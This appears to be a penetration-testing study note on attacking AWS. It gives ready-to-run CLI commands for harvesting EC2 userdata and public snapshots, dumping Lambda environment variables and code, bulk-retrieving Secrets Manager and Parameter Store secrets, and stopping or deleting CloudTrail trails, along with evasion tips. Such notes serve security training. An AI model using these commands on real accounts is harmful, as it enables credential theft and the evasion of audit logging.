# 01.6 — EC2, Lambda, Secrets Manager, and CloudTrail

## What This Note Covers

EC2 instance attacks beyond the metadata service, Lambda function exploitation, Secrets Manager enumeration, and CloudTrail — what it logs, what it misses, and how attackers evade it.

---

## EC2 Attacks

### 1. Userdata Exposure

EC2 userdata (the startup script) is stored and retrievable by any authenticated principal with `ec2:DescribeInstanceAttribute`.

```bash
# Get userdata for a specific instance
aws ec2 describe-instance-attribute \
  --instance-id i-0abc123456 \
  --attribute userData \
  --query 'UserData.Value' \
  --output text | base64 --decode

# Common finds in userdata:
# - Database connection strings
# - Application API keys
# - Bootstrap credentials
# - Configuration management tokens (Ansible, Puppet, Chef)
# - Scripts that fetch additional secrets from S3 (look for the S3 path)
```

### 2. EBS Snapshot Exposure

EBS snapshots are disk images that can be shared. Publicly shared snapshots can be mounted by anyone and the full filesystem read.

```bash
# Find public snapshots owned by a specific account
aws ec2 describe-snapshots \
  --owner-ids 123456789012 \
  --filters "Name=snapshot-id,Values=snap-*" \
  --query 'Snapshots[?Public==`true`]'

# Or search for all public snapshots (attacker perspective — no account ID needed)
aws ec2 describe-snapshots \
  --filters "Name=description,Values=*company*" \
  --owner-ids self public \
  --region us-east-1

# Mount a public snapshot (in your own AWS account):
# 1. Create a volume from the snapshot
aws ec2 create-volume \
  --snapshot-id snap-0abc123 \
  --availability-zone us-east-1a

# 2. Attach to your EC2 instance
aws ec2 attach-volume \
  --volume-id vol-0abc123 \
  --instance-id i-YOUR_INSTANCE \
  --device /dev/sdf

# 3. Mount and browse
sudo mount /dev/xvdf1 /mnt/target
ls /mnt/target
grep -r "password\|secret\|api_key" /mnt/target/etc/ /mnt/target/home/
```

> [!danger] Public snapshots = full disk access
> Any publicly shared EBS snapshot gives read access to the entire filesystem. This includes `/etc/passwd`, application configs, credential files, private keys, database files, and anything else on disk.

### 3. AMI Sharing Misconfigurations

Custom AMIs can also be shared publicly. An AMI is a full disk image of an EC2 instance.

```bash
# Search for public AMIs owned by a target account
aws ec2 describe-images \
  --owners 123456789012 \
  --filters "Name=is-public,Values=true"

# Launch an instance from the AMI to explore it
aws ec2 run-instances \
  --image-id ami-0TARGET \
  --instance-type t2.micro \
  --key-name YOUR_KEYPAIR

# SSH in and search the filesystem
```

### 4. Security Group Misconfigurations

```bash
# Find security groups with unrestricted inbound access
aws ec2 describe-security-groups \
  --filters "Name=ip-permission.cidr,Values=0.0.0.0/0" \
  --query 'SecurityGroups[].{ID:GroupId,Name:GroupName,Rules:IpPermissions}'

# Focus on dangerous ports open to the internet:
# 22 (SSH), 3389 (RDP), 3306 (MySQL), 5432 (PostgreSQL),
# 6379 (Redis), 27017 (MongoDB), 9200 (Elasticsearch)
```

## Lambda Attacks

### 1. Environment Variable Exposure

Lambda environment variables are visible to anyone with `lambda:GetFunctionConfiguration`. Developers frequently store secrets here.

```bash
# List all Lambda functions
aws lambda list-functions --region us-east-1

# Get environment variables for a function
aws lambda get-function-configuration \
  --function-name TARGET_FUNCTION \
  --query 'Environment.Variables'

# Bulk check all functions for secrets
aws lambda list-functions --region us-east-1 \
  --query 'Functions[].FunctionName' \
  --output text | tr '\t' '\n' | while read fn; do
    echo "=== $fn ==="
    aws lambda get-function-configuration \
      --function-name "$fn" \
      --query 'Environment.Variables' 2>/dev/null
  done
```

### 2. Overprivileged Execution Roles

Every Lambda function has an IAM role (execution role). If that role has excessive permissions, compromising the function means accessing everything the role can do.

```bash
# Get the execution role of a Lambda function
aws lambda get-function-configuration \
  --function-name TARGET_FUNCTION \
  --query 'Role'

# Returns: arn:aws:iam::123456789012:role/LambdaAdminRole

# Check what that role can do
ROLE_ARN=$(aws lambda get-function-configuration \
  --function-name TARGET_FUNCTION \
  --query 'Role' --output text)
ROLE_NAME=$(echo $ROLE_ARN | cut -d/ -f2)
aws iam list-attached-role-policies --role-name $ROLE_NAME
```

### 3. Function Enumeration and Code Download

```bash
# Get the function code (returns a pre-signed URL to download the deployment package)
aws lambda get-function \
  --function-name TARGET_FUNCTION \
  --query 'Code.Location'

# Download the zip
curl -o function.zip "PRE_SIGNED_URL"
unzip function.zip -d function-code/

# Search the code for hardcoded secrets
grep -r "password\|secret\|api_key\|token" function-code/
```

### 4. Invocation Testing

If you have `lambda:InvokeFunction`, you can invoke functions directly and potentially trigger unintended behaviour.

```bash
# Invoke a Lambda function
aws lambda invoke \
  --function-name TARGET_FUNCTION \
  --payload '{"test": "payload"}' \
  --cli-binary-format raw-in-base64-out \
  output.json

cat output.json
```

## Secrets Manager and Parameter Store

### Secrets Manager

AWS Secrets Manager stores secrets (database passwords, API keys, certificates) and handles rotation. It's far better than env variables — but access is still IAM-controlled.

```bash
# List all secrets in the account
aws secretsmanager list-secrets --region us-east-1

# Get the value of a secret
aws secretsmanager get-secret-value \
  --secret-id arn:aws:secretsmanager:us-east-1:123456789012:secret:prod/db/password \
  --region us-east-1

# Returns:
{
    "Name": "prod/db/password",
    "SecretString": "{\"username\":\"admin\",\"password\":\"SuperSecret123\"}"
}

# List all secrets and try to retrieve each
aws secretsmanager list-secrets --query 'SecretList[].Name' --output text | \
  tr '\t' '\n' | while read secret; do
    echo "=== $secret ==="
    aws secretsmanager get-secret-value --secret-id "$secret" 2>/dev/null
  done
```

### Systems Manager Parameter Store

Parameter Store is similar but stores parameters (plain strings, SecureString encrypted with KMS).

```bash
# List all parameters
aws ssm describe-parameters --region us-east-1

# Get a parameter value
aws ssm get-parameter \
  --name /prod/database/password \
  --with-decryption \
  --region us-east-1

# Get all parameters with decryption
aws ssm get-parameters-by-path \
  --path / \
  --recursive \
  --with-decryption \
  --region us-east-1 \
  --query 'Parameters[].{Name:Name,Value:Value}'
```

> [!tip] Parameter Store access is often overlooked
> IAM policies for SSM Parameter Store are frequently too broad (`ssm:GetParameter` on `*`). If your identity can read parameters, iterate through all paths — you'll find credentials.

## CloudTrail — Logging, Blind Spots, and Evasion

### What CloudTrail Is

AWS CloudTrail records API calls made in your AWS account. It's the primary audit log for all AWS activity.

**What it logs:**
- Management events: creating/deleting/modifying resources, IAM changes, console logins
- Data events (optional): S3 object-level access, Lambda invocations, DynamoDB operations

**What it doesn't log by default:**
- S3 data events (GetObject, PutObject, DeleteObject)
- Lambda invocation events
- Read-only API calls from some services
- Actions taken inside EC2 instances (OS-level activity)

### Finding CloudTrail Gaps

```bash
# List all trails
aws cloudtrail describe-trails

# Check if a trail is logging
aws cloudtrail get-trail-status --name TRAIL_NAME
# Look for: "IsLogging": true/false

# Check which regions have trails
aws cloudtrail describe-trails --include-shadow-trails
# "IsMultiRegionTrail": false → only covers one region → other regions have no logging

# Check data event configuration
aws cloudtrail get-event-selectors --trail-name TRAIL_NAME
# If "DataResources" is empty → S3 data events not logged
```

### CloudTrail Blind Spots (for Attackers)

```
Services that don't fully log to CloudTrail:
- S3 data events (unless explicitly enabled)
- Lambda invocation payloads (only metadata logged)
- EC2 SSM Session Manager commands (separate logging to CloudWatch/S3)
- Actions within EC2 instances (OS commands, filesystem access)
- Route53 resolver query logs (separate service)
- VPC Flow Logs (network traffic, separate service)
```

### Log Disabling / Manipulation

```bash
# Stop logging (requires cloudtrail:StopLogging)
aws cloudtrail stop-logging --name TRAIL_NAME

# Delete a trail (requires cloudtrail:DeleteTrail)
aws cloudtrail delete-trail --name TRAIL_NAME

# Modify event selectors to reduce what's logged
aws cloudtrail put-event-selectors \
  --trail-name TRAIL_NAME \
  --event-selectors '[{"ReadWriteType":"ReadOnly","IncludeManagementEvents":false}]'
```

> [!danger] Disabling CloudTrail is itself logged (briefly)
> The act of disabling CloudTrail generates a CloudTrail event — which is logged before it's disabled. In organisations with real-time alerting (CloudWatch Events → SNS), this will trigger an alert. Use more subtle techniques.

### Stealthier Evasion Techniques

1. **Use services with minimal logging** — some services generate less obvious logs
2. **Use `--no-sign-request` for public resources** — unauthenticated requests to public S3 buckets don't show in CloudTrail
3. **Use read-only operations** — `list*`, `describe*`, `get*` are often not alerted on
4. **Avoid IAM operations** — IAM changes are heavily monitored
5. **Stay within the same region** as CloudTrail trails to appear "normal"

## Quick Reference — EC2, Lambda, Secrets

```bash
# EC2
aws ec2 describe-instance-attribute --instance-id ID --attribute userData \
  --query 'UserData.Value' --output text | base64 --decode
aws ec2 describe-snapshots --owner-ids ACCOUNT_ID --filters "Name=snapshot-id,Values=snap-*"
aws ec2 describe-security-groups --filters "Name=ip-permission.cidr,Values=0.0.0.0/0"

# Lambda
aws lambda list-functions --region REGION
aws lambda get-function-configuration --function-name NAME --query 'Environment.Variables'
aws lambda get-function --function-name NAME --query 'Code.Location'

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# SSM Parameter Store
aws ssm get-parameters-by-path --path / --recursive --with-decryption

# CloudTrail
aws cloudtrail describe-trails --include-shadow-trails
aws cloudtrail get-trail-status --name TRAIL_NAME
aws cloudtrail get-event-selectors --trail-name TRAIL_NAME
```
